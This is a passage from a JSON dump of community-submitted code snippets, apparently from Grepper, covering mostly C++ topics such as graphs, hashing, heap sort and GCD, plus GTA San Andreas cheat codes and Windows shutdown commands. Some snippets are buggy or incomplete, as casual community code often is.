    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2227,
    "keyword": null,
    "link": null,
    "title": " goto c++",
    "description": "//The goto statement is used for transferring the control of a program to a given label //goto and label must be in a function. goto label; ... ... label: statement;\nTransfer control to a specified label \n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2228,
    "keyword": null,
    "link": null,
    "title": " gradle build failed",
    "description": "if you try to build to android and its stuck on \"IL2CPP\" or \"Gradle\"      so make sure the game file saving on a place without letters on other language    or special letters like \"\"~`'\\/., etc\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2229,
    "keyword": null,
    "link": null,
    "title": " gradle build failed see the console for details unity",
    "description": "if you try to build to android and its stuck on \"IL2CPP\" or \"Gradle\"      so make sure the game file saving on a place without letters on other language    or special letters like \"\"~`'\\/., etc\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2230,
    "keyword": null,
    "link": null,
    "title": " graph c++",
    "description": "",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2231,
    "keyword": null,
    "link": null,
    "title": " graph using djacency matrix c++",
    "description": "// Adjacency Matrix representation in C++  #include <iostream> using namespace std;  class Graph {    private:   bool** adjMatrix;   int numVertices;     public:   // Initialize the matrix to zero   Graph(int numVertices) {     this->numVertices = numVertices;     adjMatrix = new bool*[numVertices];     for (int i = 0; i < numVertices; i++) {       adjMatrix[i] = new bool[numVertices];       for (int j = 0; j < numVertices; j++)         adjMatrix[i][j] = false;     }   }    // Add edges   void addEdge(int i, int j) {     adjMatrix[i][j] = true;     adjMatrix[j][i] = true;   }    // Remove edges   void removeEdge(int i, int j) {     adjMatrix[i][j] = false;     adjMatrix[j][i] = false;   }    // Print the martix   void toString() {     for (int i = 0; i < numVertices; i++) {       cout << i << \" : \";       for (int j = 0; j < numVertices; j++)         cout << adjMatrix[i][j] << \" \";       cout << \"\\n\";     }   }    ~Graph() {     for (int i = 0; i < numVertices; i++)       delete[] adjMatrix[i];     delete[] adjMatrix;   } };  int main() {   Graph g(4);    g.addEdge(0, 1);   g.addEdge(0, 2);   g.addEdge(1, 2);   g.addEdge(2, 0);   g.addEdge(2, 3);    g.toString(); }\n",
    "reg_date": "2021-10-12T11:40:33.000Z"
  },
  {
    "id": 2232,
    "keyword": null,
    "link": null,
    "title": " graph using queue c++",
    "description": "#include<iostream> #include <list>   using namespace std;     class Graph {     int V;             list<int> *adj;    public:     Graph(int V);              void addEdge(int v, int w);             void BFS(int s);   };   Graph::Graph(int V) {     this->V = V;     adj = new list<int>[V]; }   void Graph::addEdge(int v, int w) {     adj[v].push_back(w);  }   void Graph::BFS(int s) {        bool *visited = new bool[V];     for(int i = 0; i < V; i++)         visited[i] = false;           list<int> queue;           visited[s] = true;     queue.push_back(s);           list<int>::iterator i;       while(!queue.empty())     {                 s = queue.front();         cout << s << \" \";         queue.pop_front();                  for (i = adj[s].begin(); i != adj[s].end(); ++i)         {             if (!visited[*i])             {                 visited[*i] = true;                 queue.push_back(*i);             }         }     } }    int main() {          Graph g(4);     g.addEdge(0, 1);     g.addEdge(0, 2);     g.addEdge(1, 2);     g.addEdge(2, 0);     g.addEdge(2, 3);     g.addEdge(3, 3);       cout << \"Following is Breadth First Traversal \"          << \"(starting from vertex 2) \\n\";     g.BFS(2);       return 0; }\nint v means \n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2233,
    "keyword": null,
    "link": null,
    "title": " gray c++",
    "description": "\tvector <string> a;     a={\"0\",\"1\"};     int i, j;     for (i = 2; i < (1<<n); i = i<<1)     {         for (j = i-1 ; j >= 0 ; j--)             a.push_back(a[j]);         for (j = 0 ; j < i ; j++)             a[j] = \"0\" + a[j];         for (j = i ; j < 2*i ; j++)             a[j] = \"1\" + a[j];     }     for (i = 0 ; i < a.size() ; i++ )         cout << a[i] << \" \";\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2234,
    "keyword": null,
    "link": null,
    "title": " greatest common denominator recursion c++",
    "description": "int gcd(int a, int b){    if(b==0)       return a;     return gcd(b, a % b); }\n#include <iostream> using namespace std; int gcd(int a, int b) {    if (b == 0)    return a;    return gcd(b, a % b); } int main() {    int a , b;    cout<<\"Enter the values of a and b: \"<<endl;    cin>>a>>b;    cout<<\"GCD of \"<< a <<\" and \"<< b <<\" is \"<< gcd(a, b);    return 0; }\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2235,
    "keyword": null,
    "link": null,
    "title": " grep xargs sed",
    "description": "grep -lr --include=config \"@rtcamp.com\" . | xargs sed -i -e 's/@rtcamp.com/@ac.rtcamp.com/g'\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2236,
    "keyword": null,
    "link": null,
    "title": " grepper",
    "description": "one Like For Grepper Community\nGrepper's cool\nfact = \"Grepper's good stuff!\" print(fact)\nbest tool forever!\nIlikethisbecauseitmakesmylifeabiteasier.\nGrepper is perfect dictonary for helping codes you are looking around\nGrepper is a cool tool\nGrepper is amazing, I highly recommend it!!\nLove Grepper\nGREPPER IS THE BEST!\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2237,
    "keyword": null,
    "link": null,
    "title": " grocery shopping list c++ chegg",
    "description": "// CPP code is Paste here and File cannot be uploaded //Purpose of Program is to add item of grocery list and add tip and checking Shipping cost #include <iostream> using namespace std; int main() { int item=0; float Milk=5.99; float Egg = 6.99; float Cheese = 10.98; float Pasta = 2.75;   float cost=0.00;// take the starting cost 0 int count=0 ;//count of items int tip=0; float valueoftip=5.00;// value of the tip float totalcost=0.00;    cout<<\"GROCERY SHOPPING ITEMS\"<<endl;    cout<<\"1. Milk : $ 5.99 / gallon\"<<endl;    cout<<\"2. Egg : $ 6.99 / dozen\"<<endl;    cout<<\"3. Cheese : $10.98 /oz\"<<endl;    cout<<\"4. Pasta : $2.75 /Packet\"<<endl;       // Asking Customer For The Items    cout<<\"Choose Your Item : \"<<endl;    cin>> item;       switch (item) { case 1: cout << \"Milk\"<<endl; cost=cost+Milk; break; case 2: cout << \"Egg\"<<endl; cost=cost+Egg; break; case 3: cout << \"Cheese\"<<endl; cost=cost+Cheese;    break; case 4: cout << \"Pasta\"<<endl; cost=cost+Pasta;    break;   } //asking customer quantity of item cout<<\"Quantity of Item :\"<<endl; cin>>count;   cout<<\"Cost is : \"; cost=cost*count; cout<<cost<<endl; //Asking User To Add Tip cout<<\"Do you Want to Add $5 Tip Press 1 for yes or 2 for no\"<<endl; cin>>tip; switch(tip) {    case 1:    \tcost=cost+valueoftip; cout<<cost<<endl;    \tbreak; case 2:    cost=cost;    cout<<cost<<endl;    break; } // Checking if the shipping is free or not //if cost is more than 20.00 than cost of shipping is added in the totalcost variable if(cost<=20.00) {    cout<<\"Your Shipping is Free\"<<endl;    totalcost = cost;    cout<<\"Total Cost is : \"<<totalcost<<endl;    } else if(20.00<cost<=35.00) { cout<<\"Your Shipping cost is $ 4.35\"<<endl;    totalcost = cost+4.35;    cout<<\"Total Cost is : \"<<totalcost<<endl;        } else { cout<<\"Your Shipping cost is $ 7.65\"<<endl; totalcost = cost+7.65; cout<<\"Total Cost is : \"<<totalcost<<endl;    }    return 0; } \n#include <iostream> using namespace std; int main() { int item=0; float Milk=5.99; float Egg = 6.99; float Cheese = 10.98; float Pasta = 2.75;   float cost=0.00;// take the starting cost 0 int count=0 ;//count of items int tip=0; float valueoftip=5.00;// value of the tip float totalcost=0.00;    cout<<\"GROCERY SHOPPING ITEMS\"<<endl;    cout<<\"1. Milk : $ 5.99 / gallon\"<<endl;    cout<<\"2. Egg : $ 6.99 / dozen\"<<endl;    cout<<\"3. Cheese : $10.98 /oz\"<<endl;    cout<<\"4. Pasta : $2.75 /Packet\"<<endl;       // Asking Customer For The Items    cout<<\"Choose Your Item : \"<<endl;    cin>> item;       switch (item) { case 1: cout << \"Milk\"<<endl; cost=cost+Milk; break; case 2: cout << \"Egg\"<<endl; cost=cost+Egg; break; case 3: cout << \"Cheese\"<<endl; cost=cost+Cheese;    break; case 4: cout << \"Pasta\"<<endl; cost=cost+Pasta;    break;   } //asking customer quantity of item cout<<\"Quantity of Item :\"<<endl; cin>>count;   cout<<\"Cost is : \"; cost=cost*count; cout<<cost<<endl; //Asking User To Add Tip cout<<\"Do you Want to Add $5 Tip Press 1 for yes or 2 for no\"<<endl; cin>>tip; switch(tip) {    case 1:    \tcost=cost+valueoftip; cout<<cost<<endl;    \tbreak; case 2:    cost=cost;    cout<<cost<<endl;    break; } // Checking if the shipping is free or not //if cost is more than 20.00 than cost of shipping is added in the totalcost variable if(cost<=20.00) {    cout<<\"Your Shipping is Free\"<<endl;    totalcost = cost;    cout<<\"Total Cost is : \"<<totalcost<<endl;    } else if(20.00<cost<=35.00) { cout<<\"Your Shipping cost is $ 4.35\"<<endl;    totalcost = cost+4.35;    cout<<\"Total Cost is : \"<<totalcost<<endl;        } else { cout<<\"Your Shipping cost is $ 7.65\"<<endl; totalcost = cost+7.65; cout<<\"Total Cost is : \"<<totalcost<<endl;    }    return 0; }\n#include <iostream> using namespace std; int main() { int item=0; float Milk=5.99; float Egg = 6.99; float Cheese = 10.98; float Pasta = 2.75;   float cost=0.00;// take the starting cost 0 int count=0 ;//count of items int tip=0; float valueoftip=5.00;// value of the tip float totalcost=0.00;    cout<<\"GROCERY SHOPPING ITEMS\"<<endl;    cout<<\"1. Milk : $ 5.99 / gallon\"<<endl;    cout<<\"2. Egg : $ 6.99 / dozen\"<<endl;    cout<<\"3. Cheese : $10.98 /oz\"<<endl;    cout<<\"4. Pasta : $2.75 /Packet\"<<endl;       // Asking Customer For The Items    cout<<\"Choose Your Item : \"<<endl;    cin>> item;       switch (item) { case 1: cout << \"Milk\"<<endl; cost=cost+Milk; break; case 2: cout << \"Egg\"<<endl; cost=cost+Egg; break; case 3: cout << \"Cheese\"<<endl; cost=cost+Cheese;    break; case 4: cout << \"Pasta\"<<endl; cost=cost+Pasta;    break;   } //asking customer quantity of item cout<<\"Quantity of Item :\"<<endl; cin>>count;   cout<<\"Cost is : \"; cost=cost*count; cout<<cost<<endl; //Asking User To Add Tip cout<<\"Do you Want to Add $5 Tip Press 1 for yes or 2 for no\"<<endl; cin>>tip; switch(tip) {    case 1:    \tcost=cost+valueoftip; cout<<cost<<endl;    \tbreak; case 2:    cost=cost;    cout<<cost<<endl;    break; } // Checking if the shipping is free or not //if cost is more than 20.00 than cost of shipping is added in the totalcost variable if(cost<=20.00) {    cout<<\"Your Shipping is Free\"<<endl;    totalcost = cost;    cout<<\"Total Cost is : \"<<totalcost<<endl;    } else if(20.00<cost<=35.00) { cout<<\"Your Shipping cost is $ 4.35\"<<endl;    totalcost = cost+4.35;    cout<<\"Total Cost is : \"<<totalcost<<endl;        } else { cout<<\"Your Shipping cost is $ 7.65\"<<endl; totalcost = cost+7.65; cout<<\"Total Cost is : \"<<totalcost<<endl;    }    return 0; }\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2238,
    "keyword": null,
    "link": null,
    "title": " gta san andreas",
    "description": "I hope this helps :)  HESOYAM - Health, Armor, $250k, Repairs car BAGUVIX - (Semi)Infinite Health CVWKXAM - Infinite Oxygen LXGIWYL - Weapon Set 1 PROFESSIONALSKIT - Weapon Set 2 UZUMYMW - Weapon Set 3 STICKLIKEGLUE - Perfect Vehicle Handling ANOSEONGLASS - Adrenaline Mode FULLCLIP - Infinite Ammo, No Reloading TURNUPTHEHEAT - Increase Wanted Level +2 TURNDOWNTHEHEAT - Clear Wanted Level BTCDBCB - Fat Body BUFFMEUP - Muscular Body KVGYZQK - Skinny Body AEZAKMI - Disable Wanted Level BRINGITON - Six Star Wanted Level WORSHIPME - Maximum Respect HELLOLADIES - Maximum Sex Appeal VKYPQCF - Maximum Stamina PROFESSIONALKILLER - Hitman Level for all Weapon Stats NATURALTALENT - Maximize All Vehicle Skill Stats SPEEDITUP - Fast Motion SLOWITDOWN - Slow Motion AJLOJYQY - People attack each other with golf clubs BAGOWPG - Have a bounty on your head FOOOXFT - Pedestrians hunt you GOODBYECRUELWORLD - Suicide BLUESUEDESHOES - Elvis Models for People BGLUAWML - People attack with Rocket Launchers LIFESABEACH - Beach Party Mode ONLYHOMIESALLOWED - Gang Members Mode BIFBUZZ - Gang Control NINJATOWN - Ninja Theme BEKKNQV - Women Talk to You CJPHONEHOME - Big Bunny Hop KANGAROO - Mega Jump STATEOFEMERGENCY - Riot Mode CRAZYTOWN - Funhouse Mode SJMAHPE - Recruit Anyone ROCKETMAYHEM - Recruit Anyone CPKTNWT - Blow Up All Cars WHEELSONLYPLEASE - Invisible car ZEIIVG - All green lights YLTEICZ - Aggressive Drivers LLQPFBN - Pink CArs IOWDLAC - Black Cars EVERYONEISPOOR - All Cheap Cars EVERYONEISRICH - All Fast Cars CHITTYCHITTYBANGBANG - Flying Cars FLYINGFISH - Flying Boats JCNRUAD - Cars Blow Up Easily SPEEDFREAK - All Cars Have Nitro BUBBLECARS - Moon Car Gravity OUIQDMW - Free Aim While Driving GHOSTTOWN - Reduced Traffic FVTMNBZ - Country Vehicles BMTPWHR - Country Vehicles and People Spawn Cheats  These codes will spawn a variety of vehicles.  ROCKETMAN - Spawn Jetpack IWPRTON - Spawn Rhino AIYPWZQP - Spawn Parachute OLDSPEEDDEMON - Spawn Bloodring Banger JQNTDMH - Spawn Rancher VROCKPOKEY - Spawn Racecar VPJTQWV - Spawn Racecar WHERESTHEFUNERAL - Spawn Romero CELEBRITYSTATUS - Spawn Stretch TRUEGRIME - Spawn Trashmaster RZHSUEW - Spawn Caddy JUMPJET - Spawn Hydra KGGGDKP - Spawn Vortex Hovercraft OHDUDE - Spawn Hunter FOURWHEELFUN - Spawn Quad AMOMHRER - Spawn Tanker Truck ITSALLBULL - Spawn Dozer FLYINGTOSTUNT - Spawn Stunt Plane MONSTERMASH - Spawn Monster Weather Cheats  The following cheat codes will adjust the weather in San Andreas.  PLEASANTLYWARM - Sunny Weather TOODAMNHOT - Very Sunny Weather ALNSFMZO - Overcast Weather AUIFRVQS - Rainy Weather CFVFGMJ - Foggy Weather YSOHNUL - Faster Clock NIGHTPROWLER - Always Midnight OFVIAC - Orange Sky SCOTTISHSUMMER - Thunderstorm CWJXUOC - Sandstorm\nwhat the fuck is wrong with you dude go play gta V\n//Best game ever\n //Game of the games !\nstill playing this go play gta v\n//Maybe\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2239,
    "keyword": null,
    "link": null,
    "title": " gtest assert not equal",
    "description": "ASSERT_NE(1, 2) // true ASSERT_NE(\"fds\", \"fds\") // false\n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2240,
    "keyword": null,
    "link": null,
    "title": " guessing game c++",
    "description": "#include <iostream> #include <cstdlib> #include <ctime> using std::cout; using std::cin; using std::endl;   int main() {      long int randnum,guess,lowerlimit,higherlimit = 0 ;     srand(time(NULL));      do     {     cout<<\"enter your lower limit number: \";     cin>> lowerlimit ;     cout<<\"enter your higher limit number:\";     cin>>higherlimit;     cout<<\"enter your guessing number between: \" <<\"  \"<< lowerlimit << \" and \"<<\"\"<<higherlimit<<\" : \";     cin>>guess;     randnum = rand()%(higherlimit-lowerlimit+1) + lowerlimit ;       // using the conditional operator instead of if / else       if(guess != randnum){         cout <<((guess > randnum)? \"your guess is large  \" : \"your guess is too small \" ) << \"and it is \" << guess << \" and computer guess is \" << randnum << endl;      }else         cout << \" GREAT, YOU WON !!!\"<<\", your guess is \" << guess << \" and computer guess is \" << randnum << endl;              }while(guess!=randnum);               return 0 ;   } \n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2241,
    "keyword": null,
    "link": null,
    "title": " hacer que me tome espacios con char c++",
    "description": "#include <iostream> //Es un componente de la biblioteca est&aacute;ndar del lenguaje de programaci&oacute;n c++ que es utilizado para operaciones de entrada/salida   using namespace std; //Especifica que los miembros de un namespace van a utilizarse frecuentemente en un programa   int main(){ //Cuerpo del programa, agrupa las instrucciones a ejecutar         cout <<  \"Introduce nombre y apellidos: \"; //Muestra en pantalla lo que est&aacute; entre comillas         cin.getline(nombre,40);  //lectura incluyendo espacios         cout << \"Hola \" << nombre << endl;         cout <<  \"Introduce nombre y apellidos: \";         cin >> nombre;  //lectura sin incluir espacios         cout << \"Hola \" << nombre << endl;         return 0; //Finalizaci&oacute;n normal del programa   } //Agrupar \n",
    "reg_date": "2021-10-12T11:40:34.000Z"
  },
  {
    "id": 2242,
    "keyword": null,
    "link": null,
    "title": " hackerEarth questions Siemens",
    "description": "struct Semaphore  {  \tenum value(0, 1);  \tQueue q;  }  P(Semaphore s)  {  \tif (s.value == 1)            {  \t\ts.value = 0;  \t}  \telse            {  \t\tq.push(P); \t            sleep();  \t}  }  V(Semaphore s)  {  \tif (s.q is empty)             {  \t\ts.value = 1;  \t}  \telse            {  \t\tq.pop();  \t\twakeup();  \t}  }  \nclass company1:     cars_manuf = 100     def x(self):          company1.cars_manuf = 150         class company2(company1):      cars_manuf = 1000     def x(self):          print(company2.cars_manuf*company1.cars_manuf)    class company3(company1):     def x(self):          cars_manuf = 10        class Partner(company2, company3):      def x(self):          partner_car_val = company2.cars_manuf/company3.cars_manuf            return partner_car_val obj = Partner()  a = obj.x() print(a)\n#include<stdio.h>  int main() {     int c[ ]={2.8,3.4,4,6.7,5};     int j, *q=c;     for(j=0;j<5;j++)     {         printf(\"%d \",*c);         ++q;     }     return 0; }\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2243,
    "keyword": null,
    "link": null,
    "title": " hackerearth3",
    "description": "#include <iostream> using namespace std;  class F {      };    class S : public F {      };  template<typename X, typename Y> class check {     class F { };     static F find( ... );           class T { F f[2]; };     static T find( Y* );      public:     enum { m = sizeof(T) == sizeof(find(static_cast<X*>(0)))};      };   template <class Q, class R>  bool checkIf() {  return check<Q, R>::m; }   int main() {          check <class F, class S> t (F,S);     cout << checkIf<class F, class S>() <<endl;     return 0;      }\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2244,
    "keyword": null,
    "link": null,
    "title": " hamming c++",
    "description": "int hamming(string a, string b) { \tint d = 0; \tfor (int i = 0; i < k; i++) { \t\tif (a[i] != b[i]) d++; \t} \treturn d;//hamming distance between 2 strings a and b }\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2245,
    "keyword": null,
    "link": null,
    "title": " hamming distance c++",
    "description": "int hamming(int a, int b) { \treturn __builtin_popcount(a^b); //hamming distance between string a and b }\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2246,
    "keyword": null,
    "link": null,
    "title": " handle pc shutdown hibernate in c/c++",
    "description": "if (isCommand(arithTrig, \"sleep\")) { \t\tcommand = true; \t\tputs(\" \"); \t\tShellExecute(NULL, _T(\"runas\"), _T(\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"), _T(\"/C \\\"powercfg -hibernate off\\\"\"), NULL, SW_SHOW); \t\tSleep(5000); \t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\Rundll32.exe powrprof.dll,SetSuspendState Sleep\"); \t} \tif (isCommand(arithTrig, \"lock\")) { \t\tcommand = true; \t\tputs(\" \"); \t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\Rundll32.exe User32.dll,LockWorkStation\"); \t} \tif (isCommand(arithTrig, \"hibernate\")) { \t\tcommand = true; \t\tputs(\" \"); \t\tShellExecute(NULL, _T(\"runas\"), _T(\"C:\\\\WINDOWS\\\\system32\\\\cmd.exe\"), _T(\"/C \\\"powercfg -hibernate on\\\"\"), NULL, SW_SHOW); \t\tSleep(5000); \t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\rundll32.exe PowrProf.dll,SetSuspendState Hibernate\"); \t} \tif (isCommand(arithTrig, \"shutdown\")) { \t\tcontinu = 0; \t\tcommand = true; \t\tif (IsPreviousToWindowsVista()) { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown -s\"); \t\t} \t\telse { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown /s\"); \t\t} \t} \tif (isCommand(arithTrig, \"shutdownnow\")) { \t\tcontinu = 0; \t\tcommand = true; \t\tif (IsPreviousToWindowsVista()) { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown -s -t 0\"); \t\t} \t\telse { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown /s /t 0\"); \t\t} \t} \tif (isCommand(arithTrig, \"restartpc\")) { \t\tcontinu = 0; \t\tcommand = true; \t\tif (IsPreviousToWindowsVista()) { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown -r\"); \t\t} \t\telse { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown /r\"); \t\t} \t} \tif (isCommand(arithTrig, \"restartpcnow\")) { \t\tcontinu = 0; \t\tcommand = true; \t\tif (IsPreviousToWindowsVista()) { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown -r -t 0\"); \t\t} \t\telse { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown /r /t 0\"); \t\t} \t}          if (isCommand(arithTrig, \"logoff\")) { \t\tcontinu = 0; \t\tcommand = true; \t\tif (IsPreviousToWindowsVista()) { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown -l\"); \t\t} \t\telse { \t\t\tsystem(\"C:\\\\WINDOWS\\\\System32\\\\shutdown /l\"); \t\t} \t}\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2247,
    "keyword": null,
    "link": null,
    "title": " has substr c++",
    "description": "if (s1.find(s2) != std::string::npos) {     std::cout << \"found!\" << '\\n'; } \n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2248,
    "keyword": null,
    "link": null,
    "title": " hashmap in cpp",
    "description": "#include <unordered_map> #include <iostream>  int main() {     std::unordered_map<std::string, int> age;     // Insert     age[\"Michael\"] = 16;     age.insert(std::pair<std::string, int>{\"Bill\", 25});     age.insert({\"Chris\", 30});      // Search and change     age[\"Michael\"] = 18;     age.at(\"Chris\") = 27;      // Check if key exists     std::string query;     query = \"Eric\";     if (age.find(query) == age.end())     {         std::cout << query << \" is not in the dictionary!\" << std::endl;     }      // Delete     query = \"Michael\";     if (age.find(query) == age.end())     {         std::cout << query << \" is not in the dictionary!\" << std::endl;     }     age.erase(query);     if (age.find(query) == age.end())     {         std::cout << query << \" is not in the dictionary!\" << std::endl;     }      // Iterate     for (const std::pair<std::string, int>& tup : age)     {         std::cout << \"Name: \" << tup.first << std::endl;         std::cout << \"Age: \" << tup.second << std::endl;     } } \n#include<unordered_map> //is the stl for unordered map\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2249,
    "keyword": null,
    "link": null,
    "title": " hashset in c++",
    "description": "template < class Key,                        // unordered_set::key_type/value_type            class Hash = hash<Key>,           // unordered_set::hasher            class Pred = equal_to<Key>,       // unordered_set::key_equal            class Alloc = allocator<Key>      // unordered_set::allocator_type            > class unordered_set;\n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2250,
    "keyword": null,
    "link": null,
    "title": " hashtable linear probing ,insertion deletion searching",
    "description": "//all the basic opertaion insertion , deletion ,searching,displaying #include <iostream>  using namespace std; void init(int arr[],int size) {     for(int i=0;i<size;i++)     {         arr[i]=-1;     } } void inserthash(int arr[],int size,int value) {     int key=value%size;     int index=key;     while(arr[index]!=-1)     {         index=(index+1)%size;         if(index==key)         {             cout<<\"hash table full\"<<endl;         }     }     arr[index]=value; } void deletehash(int arr[],int size,int value) {     int key=value%size;     int index=key;     while(arr[index]!=value)     {         index=(index+1)%size;         if(index==key)         {             cout<<\"value to be deleted not found\"<<endl;         }     }     arr[index]=-1; } int searchhash(int arr[],int size,int value) {     int key=value%size;     int index=key;     while(arr[index]!=value)     {         index=(index+1)%size;         if(index==key)         {             return 0;         }     }     return 1;  } void display(int arr[],int size) {     for(int i=0;i<size;i++)     {         cout<<arr[i]<<\" \";     }     cout<<endl; } int main() {     int n;     cout<<\"enter the size:\"<<endl;     cin>>n;     int a[n];     init(a,n);     int choice;     while(1)     {         cout<<\"1. insert\"<<endl<<\"2.delete\"<<endl<<\"3.search\"<<endl<<\"4. display\"<<endl<<\"5. exit\"<<endl;        cout<<\"enter the choice:\"<<endl;        cin>>choice;        switch(choice)        {            case 1:                {                    int val;                    cout<<\"enter the value you want to insert:\"<<endl;                    cin>>val;                    inserthash(a,n,val);                    break;                }            case 2:             {                 int val;                 cout<<\"enter the value you want to delete:\"<<endl;                 cin>>val;                 deletehash(a,n,val);                 break;             }            case 3:             {                 int val;                 cout<<\"enter the value to be searched:\"<<endl;                 cin>>val;                 int l= searchhash(a,n,val);                 if(l==1)                 {                     cout<<\"value found\"<<endl;                 }                 else                 {                     cout<<\"not found\"<<endl;                 }                 break;             }            case 4:             {                 display(a,n);                 break;             }            case 5:             {                 exit(0);             }            default:             {                 cout<<\"invalid choice\"<<endl;             }        }     } } \n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2251,
    "keyword": null,
    "link": null,
    "title": " haxelib install cpp",
    "description": "haxelib install hxcpp 4.2.1 \n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2252,
    "keyword": null,
    "link": null,
    "title": " header file for unordered map in c++",
    "description": "#include<unordered_map> //is the stl for unordered map\n#include<unordered_map> \n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2253,
    "keyword": null,
    "link": null,
    "title": " header file for vector in cpp",
    "description": "#include <iostream> #include <vector>   \n",
    "reg_date": "2021-10-12T11:40:35.000Z"
  },
  {
    "id": 2254,
    "keyword": null,
    "link": null,
    "title": " heap allocated array in c ++",
    "description": "//                                 Heap allocated array in c++ //using std::vector #include <vector> std::vector<myarray> bestArray(100); //A vector is a dynamic array, which (by default) allocates elements from the heap  //or managing memory yourself myarray* heapArray = new myarray[100]; delete [] heapArray; // when you're done  //How to use vector to put elements inside the array. // C++11: std::vector<myarray> bestArray{ 1, 2, 3 };  // C++03: std::vector<myarray> bestArray; bestArray.push_back(myarray(1)); bestArray.push_back(myarray(2)); bestArray.push_back(myarray(3)); \n//Heap array std::array<myarray, 3> stack_array; // Size must be declared explicitly.VLAs  //Stack array std::vector<myarray> heap_array (3); // Size is optional. \n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2255,
    "keyword": null,
    "link": null,
    "title": " heap buffer overflow c++",
    "description": "Simple case Explanation - you are trying to access such an address for which you  haven't declared your variable, to find all such errors revisit all your conditions and check if you are accessing something out of bounds  or not.\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2256,
    "keyword": null,
    "link": null,
    "title": " heap sort heapify and max heap in binary tree",
    "description": "Implementation of heap sort in C:  #include <stdio.h> int main() {    int heap[10], array_size, i, j, c, root, temporary;    printf(\"\\n Enter size of array to be sorted :\");    scanf(\"%d\", &array_size);    printf(\"\\n Enter the elements of array : \");    for (i = 0; i < array_size; i++)       scanf(\"%d\", &heap[i]);    for (i = 1; i < array_size; i++)    {        c = i;        do        {            root = (c - 1) / 2;                        if (heap[root] < heap[c])   /* to create MAX heap array */            {                                  // if child is greater than parent swap them                temporary = heap[root];      // as structure is of complete binary tree                heap[root] = heap[c];     // it took logn steps to reach from root to leaf                heap[c] = temporary;            }            c = root;        } while (c != 0);    }    printf(\"Heap array : \");    for (i = 0; i < array_size; i++)        printf(\"%d\\t \", heap[i]);         //printing the heap array    for (j = array_size - 1; j >= 0; j--)    {        temporary = heap[0];        heap[0] = heap[j] ;   /* swap max element with rightmost leaf element */        heap[j] = temporary;        root = 0;        do        {            c = 2 * root + 1;    /* left node of root element */            if ((heap[c] < heap[c + 1]) && c < j-1)                c++;            if (heap[root]<heap[c] && c<j)    /* again rearrange to max heap array */            {                temporary = heap[root];                heap[root] = heap[c];                heap[c] = temporary;            }            root = c;        } while (c < j);    }    printf(\"\\n The sorted array is : \");    for (i = 0; i < array_size; i++)       printf(\"\\t %d\", heap[i]); }\n",
    "reg_date": "2021-10-12T11:40:36.000Z"
  },
  {
    "id": 2257,
    "keyword": null,
    "link": null,
    "title": " heap sort internal implementation using c++",
    "description": "Implementation of heap sort in C:  #include <stdio.h> int main() {    int heap[10], array_size, i, j, c, root, temporary;    printf(\"\\n Enter size of array to be sorted :\");    scanf(\"%d\", &array_size);    printf(\"\\n Enter the elements of array : \");    for (i = 0; i < array_size; i++)       scanf(\"%d\", &heap[i]);    for (i = 1; i < array_size; i++)    {        c = i;        do        {            root = (c - 1) / 2;                        if (heap[root] < heap[c])   /* to create MAX heap array */            {                                  // if child is greater than parent swap them                temporary = heap[root];      // as structure is of complete binary tree                heap[root] = heap[c];     // it took logn steps to reach from root to leaf                heap[c] = temporary;            }            c = root;        } while (c != 0);    }    printf(\"Heap array : \");    for (i = 0; i < array_size; i++)        printf(\"%d\\t \", heap[i]);         //printing the heap array    for (j = array_size - 1; j >= 0; j--)    {        temporary = heap[0];        heap[0] = heap[j] ;   /* swap max element with rightmost leaf element */        heap[j] = temporary;        root = 0;        do        {            c = 2 * root + 1;    /* left node of root element */            if ((heap[c] < heap[c + 1]) && c < j-1)                c++;            if (heap[root]<heap[c] && c<j)    /* again rearrange to max heap array */            {                temporary = heap[root];                heap[root] = heap[c];                heap[c] = temporary;            }            root = c;        } while (c < j);    }    printf(\"\\n 